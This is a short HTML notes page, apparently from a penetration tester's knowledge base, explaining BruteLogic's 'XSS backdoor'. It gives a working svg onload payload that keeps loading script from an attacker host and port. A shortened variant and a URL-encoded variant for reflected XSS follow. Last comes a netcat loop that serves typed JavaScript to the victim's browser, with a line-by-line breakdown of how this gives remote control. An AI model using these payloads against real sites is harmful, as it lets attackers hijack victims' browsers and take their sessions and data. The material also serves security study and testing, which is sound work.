<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>XSS Backdoor (by BruteLogic)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>XSS Backdoor (by BruteLogic)</h1><br /><strong>
      <h3>XSS Backdoor (by BruteLogic aka Rodolfo Assis)<br /><br /></h3>
    </strong><strong>
      <h3>WARNING: NOT TESTED</h3>
    </strong><strong>
      <h3><br />XSS injection script<br /></h3>
    </strong>This code creates dynamically a script element on the page that will use attacker’s host and port as a
    source to execute javascript code on the Web Application, regularly.<br />1. the below script work only if the more
    simpler XSS <code>&lt;svg onload=alert(&quot;XSS&quot;)&gt;</code> could also be executed<br />2. XSS
    backdoor<strong><br /></strong>
    <div class="codebox">
      <div class="codebox"><span
          style="color:#000000;font-weight:400">&lt;</span>svg&nbsp;onload=setInterval(function(){d=document;z=d.createElement(&quot;script&quot;);z.src=&quot;//ATTACKERHOST:PORT&quot;;d.body.appendChild(z)},0)<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /><span style="text-decoration:underline;">Break down the code:</span><br />• &lt;svg onload=....&gt; → it
    is the XSS vector<br /> ◇ setInterval(..., 0) → javascript function to make the code run at intervals of time (in
    our case, 0). Needed to keep the connection alive<br /> ▪ function(){...} → group the code in a js function in order
    to make the setInterval() work.<br /> - d=document; → Just an assignment to shorten the code<br /> -
    z=d.createElement(“script”); → creation of a script element. Equals to document.createElement(“script”) because of
    the previous assignment.<br /> - z.src=”//HOST:PORT”; → assign a source to the script element with a pair HOST:PORT
    (HOST as domain or IP), the ones from the machine which will be used to control the browser.<br /> -
    d.body.appendChild(z) → The element z is appended to the body of the current HTML document d<br /><br /> <span
      style="text-decoration:underline;">Other versions of the code</span>:<br /> ◇ shorted version(7 bytes less):<br />
    <div class="codebox">
      <div class="codebox"><span
          style="color:#000000;font-weight:400">&lt;</span>svg/onload=setInterval(function(){with(document)body.appendChild(createElement(“script”)).src=”//HOST:PORT”},0)<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> ◇ <a
      href="Cross_Site_Scripting(XSS)--Identify_XSS_contexts--WAF_bypass_and_filter_tests--2._Test_characters--simple_Encoding_URL_(percent_encoding).html">URL-encoded
      version</a> of the above script to be used in URI for simple Reflected XSS: <br />
    <div class="codebox">
      <div class="codebox">
        %3Csvg%20onload%3DsetInterval(function()%7Bd%3Ddocument%3Bz%3Dd.createElement(%22script%22)%3Bz.src%3D%22%2F%2Fexample.org%3A1234%22%3Bd.body.appendChild(z)%7D%2C0)%3E
      </div>
    </div><br /><br />3. On the terminal of the attacker type<br />
    <div class="codebox">
      <div class="codebox">
        while&nbsp;:;&nbsp;do&nbsp;printf&nbsp;&quot;j$&nbsp;&quot;;&nbsp;read&nbsp;c;&nbsp;echo&nbsp;$c&nbsp;|&nbsp;nc&nbsp;-lvvp&nbsp;PORT&nbsp;&gt;/dev/null;&nbsp;done
      </div>
    </div><br />It sets the listening on the PORT number (-lp) making use of netcat (nc) and redirecting the output
    (browser requests) to nowhere (&gt;/dev/null). This is done in an endless loop (“while :” and “done”), printing the
    pseudo command prompt (j$) and reading the input from keyboard (read c) to feed the netcat listener (echo $c with
    the pipe to nc).<br />Once the XSS payload gets execution, the browser fires a request to our host:port looking for
    a source to the script element recently created. Then, the command piped to netcat becomes the response of this
    request, with javascript code to be executed. As a new script element is created by setInterval() each 0 millisecond
    and the netcat loop is always ready to send a new source, we have an interactive stateless connection to remote
    control the client.<br /><br /><br /><br /><br />Bibliography:<br />• Article XSS backdoor: <a
      href="http://brutelogic.com.br/blog/using-xss-to-control-a-browser/">http://brutelogic.com.br/blog/using-xss-to-control-a-browser/</a><br />•
    Rodolfo Assis 2020 cheatsheet: <a
      href="https://it1lib.org/book/16086758/42740e" target="_blank">https://it1lib.org/book/16086758/42740e</a><br />
  </div>
</body>

</html>